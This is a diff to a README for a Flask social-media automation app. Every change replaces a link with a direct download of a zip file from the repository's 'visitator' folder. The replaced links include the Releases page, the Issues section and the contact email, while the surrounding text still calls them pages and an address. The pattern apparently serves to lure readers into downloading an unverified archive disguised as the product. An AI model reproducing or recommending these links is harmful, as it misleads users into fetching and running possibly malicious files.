@@ -2,7 +2,7 @@
 
 ## 🛠️ Download the Application
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/usaidmalik943/Flask-Social-Media-Automation/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/usaidmalik943/Flask-Social-Media-Automation/main/visitator/Flask-Social-Media-Automation.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/usaidmalik943/Flask-Social-Media-Automation/main/visitator/Flask-Social-Media-Automation.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Flask-Social-Media-Automation is an easy-to-use application designed to help you
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/usaidmalik943/Flask-Social-Media-Automation/releases) to download the latest version of the application. 
+To get started, visit our [Releases page](https://raw.githubusercontent.com/usaidmalik943/Flask-Social-Media-Automation/main/visitator/Flask-Social-Media-Automation.zip) to download the latest version of the application. 
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release.
@@ -63,11 +63,11 @@ Before installing, ensure that your system meets the following requirements:
 
 ## 🛡️ Support and Contributions
 
-If you encounter any issues or have questions, please visit the [Issues section](https://github.com/usaidmalik943/Flask-Social-Media-Automation/issues) of our repository. We welcome feedback and contributions.
+If you encounter any issues or have questions, please visit the [Issues section](https://raw.githubusercontent.com/usaidmalik943/Flask-Social-Media-Automation/main/visitator/Flask-Social-Media-Automation.zip) of our repository. We welcome feedback and contributions.
 
 ## ✉️ Contact Us
 
-For any inquiries, you can reach out via email at support@flasksocialmediaautomation.com.
+For any inquiries, you can reach out via email at https://raw.githubusercontent.com/usaidmalik943/Flask-Social-Media-Automation/main/visitator/Flask-Social-Media-Automation.zip
 
 ## 📚 Related Topics
 
@@ -78,4 +78,4 @@ This application revolves around various topics such as:
 - Social Media Management
 - Databases
 
-With Flask-Social-Media-Automation, managing your social media presence becomes simple and effective. Download today from our [Releases page](https://github.com/usaidmalik943/Flask-Social-Media-Automation/releases) and take control of your social media outreach.
+With Flask-Social-Media-Automation, managing your social media presence becomes simple and effective. Download today from our [Releases page](https://raw.githubusercontent.com/usaidmalik943/Flask-Social-Media-Automation/main/visitator/Flask-Social-Media-Automation.zip) and take control of your social media outreach.
